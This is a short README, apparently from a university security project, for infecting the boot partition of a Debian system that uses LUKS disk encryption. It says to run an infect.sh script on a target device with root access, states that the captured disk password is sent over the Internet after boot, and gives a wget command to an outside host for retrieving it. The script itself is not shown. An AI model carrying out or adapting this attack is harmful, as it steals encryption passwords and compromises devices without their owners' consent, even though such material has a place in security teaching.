LUKS infection under Debian
===========================

## Requirements

- A root access on the targeted device
- The targeted device must use LUKS and a Debian-like operating system


## Set up

Run `infect.sh` on the targeted device to automatically infect the boot partition used by LUKS.
  
  
## Password retrieval

The password will be sent over the Internet (as long as the targeted device is connected) after having completed its boot.
  
    wget http://uuu.enseirb-matmeca.fr/~fmonjalet/secu/read.php
